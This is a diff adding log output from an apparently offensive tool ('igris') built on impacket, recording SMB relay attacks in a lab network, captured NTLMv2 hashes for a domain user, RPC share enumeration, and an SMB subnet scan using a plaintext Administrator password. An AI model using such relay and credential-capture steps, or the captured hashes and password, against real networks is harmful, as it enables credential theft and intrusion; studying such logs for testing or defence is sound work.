@@ -109,3 +109,330 @@
 2021-10-18 10:15:27.483 | DEBUG    | impacket.examples.ntlmrelayx.attacks:<module>:75 - Protocol Attack LDAPS loaded..
 2021-10-18 10:15:27.485 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
 2021-10-18 10:15:27.485 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
+2021-10-19 09:54:50.748 | DEBUG    | project.RelayAttacks.relayattacks:do_smb_relay:70 - Starting smb relay attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-19 09:54:50.767 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-19 09:55:36.222 | DEBUG    | project.RelayAttacks.relayattacks:do_smb_relay:70 - Starting smb relay attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-19 09:55:36.223 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-19 09:55:38.260 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-10-19 09:55:38.264 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-10-19 09:55:56.706 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,60153)
+2021-10-19 09:55:56.707 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,60153)
+2021-10-19 09:55:57.030 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-19 09:55:57.033 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-19 09:55:57.033 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-19 09:55:57.037 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-19 09:55:57.037 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:12345678abcdef00:f14dc6246687f24c7ff9ad4b478588c1:0101000000000000005ea782cfc4d70121ce225d8ae0afdf000000000100100042005400470070004f0049004a0075000300100042005400470070004f0049004a0075000200100073004300650049006d004900790079000400100073004300650049006d0049007900790007000800005ea782cfc4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000
+2021-10-19 09:55:57.038 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:12345678abcdef00:f14dc6246687f24c7ff9ad4b478588c1:0101000000000000005ea782cfc4d70121ce225d8ae0afdf000000000100100042005400470070004f0049004a0075000300100042005400470070004f0049004a0075000200100073004300650049006d004900790079000400100073004300650049006d0049007900790007000800005ea782cfc4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000
+2021-10-19 09:55:57.088 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-19 09:55:57.088 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-19 09:55:57.162 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-19 09:55:57.163 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-19 09:55:57.426 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 09:55:57.427 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:19:34.895 | DEBUG    | project.RelayAttacks.relayattacks:do_smb_relay:70 - Starting smb relay attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-19 10:19:34.896 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-19 10:19:42.577 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,60210)
+2021-10-19 10:19:42.580 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,60210)
+2021-10-19 10:19:42.615 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-19 10:19:42.615 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-19 10:19:42.616 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-19 10:19:42.625 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-19 10:19:42.626 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:2a7094fa0ed84ced4cc777d871a89add:010100000000000000b39dd4d2c4d70130a32cd16806a52f000000000100100074006c007200680069004c00580079000300100074006c007200680069004c0058007900020010005000470059005a0076004b0070004400040010005000470059005a0076004b00700044000700080000b39dd4d2c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a0010000000000000000000000000000000000009001c0063006900660073002f006c0065006c002e006c006f00630061006c000000000000000000
+2021-10-19 10:19:42.626 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:2a7094fa0ed84ced4cc777d871a89add:010100000000000000b39dd4d2c4d70130a32cd16806a52f000000000100100074006c007200680069004c00580079000300100074006c007200680069004c0058007900020010005000470059005a0076004b0070004400040010005000470059005a0076004b00700044000700080000b39dd4d2c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a0010000000000000000000000000000000000009001c0063006900660073002f006c0065006c002e006c006f00630061006c000000000000000000
+2021-10-19 10:19:42.645 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-19 10:19:42.647 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-19 10:19:42.663 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-19 10:19:42.665 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-19 10:19:42.776 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:19:42.777 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:19:53.285 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-19 10:19:53.290 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-19 10:19:53.298 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,60210)
+2021-10-19 10:19:53.303 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,60210)
+2021-10-19 10:19:53.303 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-19 10:19:53.307 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-19 10:25:34.253 | DEBUG    | project.RelayAttacks.relayattacks:do_smb_relay:70 - Starting smb relay attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-19 10:25:34.254 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-19 10:25:38.746 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57802)
+2021-10-19 10:25:38.749 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57802)
+2021-10-19 10:25:38.772 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-19 10:25:38.773 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-19 10:25:38.774 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-19 10:25:38.774 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-19 10:25:38.775 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:7811f62ea9e68f32285ea35c436303c5:010100000000000000fdcea8d3c4d701f185ba3471c2e51e000000000100100072004200550055007600480071007900030010007200420055005500760048007100790002001000440057006e0044004b0075005700580004001000440057006e0044004b007500570058000700080000fdcea8d3c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a0010000000000000000000000000000000000009001c0063006900660073002f006c0065006c002e006c006f00630061006c000000000000000000
+2021-10-19 10:25:38.776 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:7811f62ea9e68f32285ea35c436303c5:010100000000000000fdcea8d3c4d701f185ba3471c2e51e000000000100100072004200550055007600480071007900030010007200420055005500760048007100790002001000440057006e0044004b0075005700580004001000440057006e0044004b007500570058000700080000fdcea8d3c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a0010000000000000000000000000000000000009001c0063006900660073002f006c0065006c002e006c006f00630061006c000000000000000000
+2021-10-19 10:25:38.797 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:25:38.799 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:25:39.008 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:25:39.010 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:25:46.576 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57803)
+2021-10-19 10:25:46.580 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57803)
+2021-10-19 10:25:46.611 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-19 10:25:46.613 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-19 10:25:46.617 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-19 10:25:46.618 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-19 10:25:46.621 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:308091aae47fb8e5729d0e737a264ab1:010100000000000000b193add3c4d70186d6a3aee17c2f05000000000100100072004200550055007600480071007900030010007200420055005500760048007100790002001000440057006e0044004b0075005700580004001000440057006e0044004b007500570058000700080000b193add3c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a001000000000000000000000000000000000000900200063006900660073002f0070006f00630068006f002e006c006f00630061006c000000000000000000
+2021-10-19 10:25:46.622 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:308091aae47fb8e5729d0e737a264ab1:010100000000000000b193add3c4d70186d6a3aee17c2f05000000000100100072004200550055007600480071007900030010007200420055005500760048007100790002001000440057006e0044004b0075005700580004001000440057006e0044004b007500570058000700080000b193add3c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a001000000000000000000000000000000000000900200063006900660073002f0070006f00630068006f002e006c006f00630061006c000000000000000000
+2021-10-19 10:25:46.648 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-19 10:25:46.648 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-19 10:25:46.665 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-19 10:25:46.665 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-19 10:25:46.708 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:25:46.709 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-19 10:25:49.507 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-19 10:25:49.509 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-19 10:25:49.518 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57802)
+2021-10-19 10:25:49.519 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57802)
+2021-10-19 10:25:49.520 | INFO     | impacket.smbserver:log:4132 - Remaining connections ['Thread-8']
+2021-10-19 10:25:49.521 | INFO     | impacket.smbserver:log:4132 - Remaining connections ['Thread-8']
+2021-10-19 10:26:00.245 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-19 10:26:00.245 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-19 10:26:00.247 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57803)
+2021-10-19 10:26:00.248 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57803)
+2021-10-19 10:26:00.248 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-19 10:26:00.248 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-19 10:26:21.553 | DEBUG    | project.smb.scan:do_scan:594 - Starting scan command using user: Administrator passwd: P@$$w0rd! subnet: 192.168.253.0/24
+2021-10-19 10:26:21.553 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-19 10:26:21.555 | INFO     | project.smb.scan:__show_user_passwd:186 - [31mUSER -> [39m[34mAdministrator[39m
+2021-10-19 10:26:21.556 | INFO     | project.smb.scan:__show_user_passwd:189 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2021-10-19 10:26:21.556 | INFO     | project.smb.scan:__synchronous_way:527 - Using synchronous scan
+2021-10-19 10:26:21.559 | INFO     | project.smb.scan:__set_up_scan_actions_synchronous:499 - Starting to launch threads based on your cpu
+2021-10-19 10:26:21.563 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.0
+2021-10-19 10:26:21.565 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.0
+2021-10-19 10:26:21.565 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.1
+2021-10-19 10:26:21.567 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.1
+2021-10-19 10:26:21.572 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.2
+2021-10-19 10:26:21.573 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.2
+2021-10-19 10:26:22.568 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.3
+2021-10-19 10:26:22.568 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.4
+2021-10-19 10:26:22.570 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.5
+2021-10-19 10:26:22.570 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.6
+2021-10-19 10:26:22.574 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.7
+2021-10-19 10:26:22.575 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.8
+2021-10-19 10:26:23.570 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.3
+2021-10-19 10:26:23.572 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.6
+2021-10-19 10:26:23.574 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.5
+2021-10-19 10:26:23.576 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.4
+2021-10-19 10:26:23.577 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.7
+2021-10-19 10:26:23.579 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.8
+2021-10-19 10:26:24.576 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.9
+2021-10-19 10:26:24.577 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.10
+2021-10-19 10:26:24.578 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.11
+2021-10-19 10:26:24.583 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.14
+2021-10-19 10:26:24.584 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.12
+2021-10-19 10:26:24.585 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.13
+2021-10-19 10:26:25.578 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.9
+2021-10-19 10:26:25.580 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.10
+2021-10-19 10:26:25.580 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.11
+2021-10-19 10:26:25.586 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.12
+2021-10-19 10:26:25.588 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.14
+2021-10-19 10:26:25.588 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.13
+2021-10-19 10:26:26.580 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.15
+2021-10-19 10:26:26.582 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.16
+2021-10-19 10:26:26.583 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.17
+2021-10-19 10:26:26.588 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.18
+2021-10-19 10:26:26.589 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.19
+2021-10-19 10:26:26.591 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.20
+2021-10-19 10:26:27.582 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.15
+2021-10-19 10:26:27.586 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.17
+2021-10-19 10:26:27.587 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.16
+2021-10-19 10:26:27.590 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.18
+2021-10-19 10:26:27.592 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.19
+2021-10-19 10:26:27.594 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.20
+2021-10-19 10:26:28.584 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.21
+2021-10-19 10:26:28.590 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.22
+2021-10-19 10:26:28.592 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.23
+2021-10-19 10:26:28.593 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.24
+2021-10-19 10:26:28.595 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.25
+2021-10-19 10:26:28.597 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.26
+2021-10-19 10:26:29.586 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.21
+2021-10-19 10:26:29.594 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.22
+2021-10-19 10:26:29.596 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.24
+2021-10-19 10:26:29.597 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.23
+2021-10-19 10:26:29.600 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.25
+2021-10-19 10:26:29.603 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.26
+2021-10-19 10:26:30.589 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.27
+2021-10-19 10:26:30.597 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.28
+2021-10-19 10:26:30.603 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.29
+2021-10-19 10:26:30.604 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.30
+2021-10-19 10:26:30.605 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.31
+2021-10-19 10:26:30.606 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.32
+2021-10-19 10:26:31.591 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.27
+2021-10-19 10:26:31.598 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.28
+2021-10-19 10:26:31.606 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.29
+2021-10-19 10:26:31.607 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.31
+2021-10-19 10:26:31.607 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.30
+2021-10-19 10:26:31.608 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.32
+2021-10-19 10:26:32.593 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.33
+2021-10-19 10:26:32.601 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.34
+2021-10-19 10:26:32.607 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.35
+2021-10-19 10:26:32.608 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.36
+2021-10-19 10:26:32.608 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.37
+2021-10-19 10:26:32.610 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.38
+2021-10-19 10:26:36.796 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.33
+2021-10-19 10:26:41.680 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.35
+2021-10-19 10:26:33.795 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.36
+2021-10-19 10:26:34.032 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.38
+2021-10-19 10:26:34.216 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.34
+2021-10-19 10:26:35.513 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.37
+2021-10-19 10:26:44.140 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.39
+2021-10-19 10:26:44.193 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.44
+2021-10-19 10:26:44.201 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.40
+2021-10-19 10:26:44.159 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.42
+2021-10-19 10:26:44.151 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.43
+2021-10-19 10:26:44.235 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.41
+2021-10-19 10:26:45.262 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.39
+2021-10-19 10:26:45.277 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.44
+2021-10-19 10:26:45.282 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.40
+2021-10-19 10:26:45.321 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.42
+2021-10-19 10:26:45.342 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.43
+2021-10-19 10:26:45.346 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.41
+2021-10-19 10:26:46.294 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.46
+2021-10-19 10:26:46.295 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.45
+2021-10-19 10:26:46.299 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.47
+2021-10-19 10:26:46.333 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.48
+2021-10-19 10:26:46.355 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.50
+2021-10-19 10:26:46.357 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.49
+2021-10-19 10:26:47.297 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.46
+2021-10-19 10:26:47.299 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.45
+2021-10-19 10:26:47.301 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.47
+2021-10-19 10:26:47.335 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.48
+2021-10-19 10:26:47.358 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.50
+2021-10-19 10:26:47.360 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb3:77 - Connection fails using smb3 at 192.168.253.49
+2021-10-19 10:26:48.300 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.51
+2021-10-19 10:26:48.303 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.52
+2021-10-19 10:26:48.304 | DEBUG    | project.smb.scan:__try_scan_connection_with_smb1:54 - Connection success using smb1 at 192.168.253.53
